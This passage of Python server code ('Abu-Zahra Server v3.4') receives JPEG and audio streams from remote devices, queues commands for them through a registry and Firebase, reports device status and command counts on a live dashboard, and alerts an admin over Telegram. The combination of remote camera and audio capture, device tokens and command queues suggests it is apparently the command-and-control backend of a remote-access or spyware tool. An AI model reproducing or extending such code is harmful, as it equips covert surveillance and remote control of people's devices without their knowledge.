            stream_type_saved = info.get("type", "") if info else ""
            if info:
                info["active"] = False
                task = _jpeg_stream_tasks_module.get(device_id)
                if task and not task.done():
                    task.cancel()
                del _jpeg_stream_tasks_module[device_id]
                del _jpeg_stream_info[device_id]

            # Also queue stop commands if it was an audio stream
            if stream_type_saved == "audio":
                queue_command(device_id, "stop_audio_stream")

            update_device(device_id, {"streaming": False})
            # Clean cached frames
            for key in list(_latest_frames_module.keys()):
                if device_id in key:
                    del _latest_frames_module[key]

            append_event("JPEG stream stopped", {"device_id": device_id})
            log.info("JPEG stream stopped: device=%s", device_id)

            return web.json_response({"ok": True, "message": "JPEG streaming stopped"})
        except Exception as exc:
            log.error("jpeg_stream_stop error: %s", exc)
            return web.json_response({"ok": False, "error": str(exc)}, status=500)

    async def api_stream_start(request):
        """POST /api/stream/start - Receive stream start notification from device"""
        global api_hits
        api_hits += 1
        try:
            body = await request.json()
            device_id = body.get("device_id", "")
            stream_id = body.get("stream_id", "")
            stream_type = body.get("stream_type", "")
            config = body.get("config", {})

            # Validate device token
            device_token = request.headers.get("X-Device-Token", "")
            if not get_device_by_token(device_id, device_token):
                return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)

            update_device(device_id, {"streaming": True, "stream_id": stream_id, "stream_type": stream_type})
            append_event("Stream started", {"device_id": device_id, "stream_id": stream_id, "type": stream_type})
            log.info("Stream started: device=%s stream=%s type=%s", device_id, stream_id, stream_type)

            return web.json_response({"ok": True})
        except Exception as exc:
            return web.json_response({"ok": False, "error": str(exc)}, status=500)

    async def api_stream_stop(request):
        """POST /api/stream/stop - Receive stream stop notification from device"""
        global api_hits
        api_hits += 1
        try:
            body = await request.json()
            device_id = body.get("device_id", "")
            stream_id = body.get("stream_id", "")
            duration = body.get("duration", 0)
            bytes_sent = body.get("bytes_sent", 0)

            # Validate device token
            device_token = request.headers.get("X-Device-Token", "")
            if not get_device_by_token(device_id, device_token):
                return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)

            update_device(device_id, {"streaming": False, "stream_id": ""})

            # Clean up cached frames
            for key in list(_latest_frames.keys()):
                if device_id in key:
                    del _latest_frames[key]
            for key in list(_latest_audio.keys()):
                if device_id in key:
                    del _latest_audio[key]

            append_event("Stream stopped", {"device_id": device_id, "stream_id": stream_id, "duration": duration, "bytes": bytes_sent})
            log.info("Stream stopped: device=%s stream=%s duration=%dms", device_id, stream_id, duration)

            return web.json_response({"ok": True})
        except Exception as exc:
            return web.json_response({"ok": False, "error": str(exc)}, status=500)

    app.router.add_get("/ws/stream", ws_stream)
    app.router.add_get("/ws/stream/viewer", ws_stream_viewer)
    app.router.add_get("/api/stream/frame/{device_id}", api_stream_frame)
    app.router.add_get("/api/stream/status", api_stream_status)
    app.router.add_post("/api/stream/start", api_stream_start)
    app.router.add_post("/api/stream/stop", api_stream_stop)
    app.router.add_post("/api/stream/jpeg_start", api_jpeg_stream_start)
    app.router.add_post("/api/stream/jpeg_stop", api_jpeg_stream_stop)

    # ========== DASHBOARD WEBSOCKET (Real-time Updates) ==========
    _dashboard_ws_clients = set()

    async def ws_dashboard(request):
        """WebSocket endpoint for dashboard real-time updates - /ws/dashboard?token=xxx"""
        ws = web.WebSocketResponse(heartbeat=30)
        await ws.prepare(request)

        # Authenticate via query param
        token = request.query.get("token", "")
        if not token or not validate_session(token):
            await ws.close(code=4001, message="Unauthorized")
            return ws

        _dashboard_ws_clients.add(ws)
        log.info("Dashboard WebSocket connected (total: %d)", len(_dashboard_ws_clients))
        try:
            # Send initial data
            devices = get_devices()
            cmds = load_json(COMMANDS_FILE, [])[-50:]
            events = load_json(EVENTS_FILE, [])[-50:]
            online = sum(1 for d in devices if d.get("active"))
            pending = sum(1 for c in cmds if c.get("status") == "pending")
            completed = sum(1 for c in cmds if c.get("status") == "completed")
            initial = {
                "type": "init",
                "devices": devices,
                "commands": cmds,
                "events": events,
                "stats": {
                    "uptime": get_uptime(),
                    "uptime_formatted": format_uptime(get_uptime()),
                    "devices_total": len(devices),
                    "devices_online": online,
                    "commands_total": len(cmds),
                    "commands_pending": pending,
                    "commands_completed": completed,
                    "messages_sent": messages_sent,
                    "api_hits": api_hits,
                    "events_total": len(events),
                    "total_registered_commands": len(COMMAND_REGISTRY),
                }
            }
            await ws.send_json(initial)

            # Keep connection alive with periodic updates
            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    if msg.data == "ping":
                        await ws.send_json({"type": "pong"})
                elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
                    break
        except Exception as exc:
            log.debug("Dashboard WS error: %s", exc)
        finally:
            _dashboard_ws_clients.discard(ws)
            log.info("Dashboard WebSocket disconnected (total: %d)", len(_dashboard_ws_clients))

        return ws

    async def broadcast_to_dashboards(message):
        """Send a message to all connected dashboard WebSocket clients."""
        if not _dashboard_ws_clients:
            return
        dead = set()
        msg_str = json.dumps(message) if not isinstance(message, str) else message
        for ws_conn in list(_dashboard_ws_clients):
            try:
                await ws_conn.send_str(msg_str)
            except Exception:
                dead.add(ws_conn)
        _dashboard_ws_clients.difference_update(dead)

    async def dashboard_push_loop():
        """Background task: periodically push stats updates to connected dashboards."""
        while True:
            await asyncio.sleep(4)
            if not _dashboard_ws_clients:
                continue
            try:
                devices = get_devices()
                cmds = load_json(COMMANDS_FILE, [])
                events = load_json(EVENTS_FILE, [])
                online = sum(1 for d in devices if d.get("active"))
                pending = sum(1 for c in cmds if c.get("status") == "pending")
                completed = sum(1 for c in cmds if c.get("status") == "completed")
                stats_msg = {
                    "type": "stats_update",
                    "stats": {
                        "uptime": get_uptime(),
                        "uptime_formatted": format_uptime(get_uptime()),
                        "devices_total": len(devices),
                        "devices_online": online,
                        "commands_total": len(cmds),
                        "commands_pending": pending,
                        "commands_completed": completed,
                        "messages_sent": messages_sent,
                        "api_hits": api_hits,
                        "events_total": len(events),
                        "total_registered_commands": len(COMMAND_REGISTRY),
                    }
                }
                await broadcast_to_dashboards(stats_msg)
            except Exception:
                pass

    app.router.add_get("/ws/dashboard", ws_dashboard)
    # Store refs for the startup hook
    app["_dashboard_ws_clients"] = _dashboard_ws_clients
    app["_broadcast_to_dashboards"] = broadcast_to_dashboards
    app["_dashboard_push_loop"] = dashboard_push_loop

    # Static files
    static_dir = Path(__file__).parent / "static"
    if static_dir.exists():
        app.router.add_static("/static", static_dir)
    
    return app


async def on_startup(app):
    ensure_data_dir()
    log.info("=" * 60)
    log.info("Abu-Zahra Server v3.4 starting...")
    log.info("Domain: %s", SERVER_DOMAIN)
    log.info("Port: %d", SERVER_PORT)
    log.info("Admin: %d", ADMIN_CHAT_ID)
    log.info("Commands: %d", len(COMMAND_REGISTRY))
    log.info("Firebase Secret: %s", "SET" if FIREBASE_DB_SECRET else "NOT SET")
    log.info("=" * 60)

    # Check Firebase connectivity at startup
    await check_firebase_connectivity()
    if not firebase_connected:
        log.warning("Firebase not reachable - running in LOCAL-ONLY mode (commands via REST API only)")
    else:
        log.info("Firebase connected - commands will be pushed to Firebase RTDB")

    # Start Telegram polling in background
    app["tg_task"] = asyncio.create_task(tg_poll_loop())
    # Start session cleanup
    app["cleanup_task"] = asyncio.create_task(session_cleanup_loop())
    # Start Firebase result listener
    app["fb_listener_task"] = asyncio.create_task(firebase_result_listener())
    # Start device monitoring (online/offline alerts)
    app["monitor_task"] = asyncio.create_task(device_monitoring_loop())
    # Start dashboard WebSocket push loop
    if app.get("_dashboard_push_loop"):
        app["dashboard_push_task"] = asyncio.create_task(app["_dashboard_push_loop"]())
    
    # Notify admin
    try:
        await send_admin(
            f"🟥 <b>Abu-Zahra Server v3.4</b> started!\n\n"
            f"📡 Port: <code>{SERVER_PORT}</code>\n"
            f"🌐 Domain: <code>{SERVER_DOMAIN}</code>\n"
            f"📋 Commands: <code>{len(COMMAND_REGISTRY)}</code>\n"
            f"📱 Web: <code>{SERVER_DOMAIN}/dashboard</code>"
        )
    except Exception:
        pass


async def on_cleanup(app):
    global polling_active
    polling_active = False
    if "tg_task" in app:
        app["tg_task"].cancel()
    if "cleanup_task" in app:
        app["cleanup_task"].cancel()
    if "fb_listener_task" in app:
        app["fb_listener_task"].cancel()
    if "monitor_task" in app:
        app["monitor_task"].cancel()
    global _tg_session
    if _tg_session and not _tg_session.closed:
        await _tg_session.close()


def main():
    app = create_app()
    app.on_startup.append(on_startup)
    app.on_cleanup.append(on_cleanup)
    
    log.info("Starting server on port %d...", SERVER_PORT)
    web.run_app(app, host="0.0.0.0", port=SERVER_PORT, print=None)


if __name__ == "__main__":
    main()
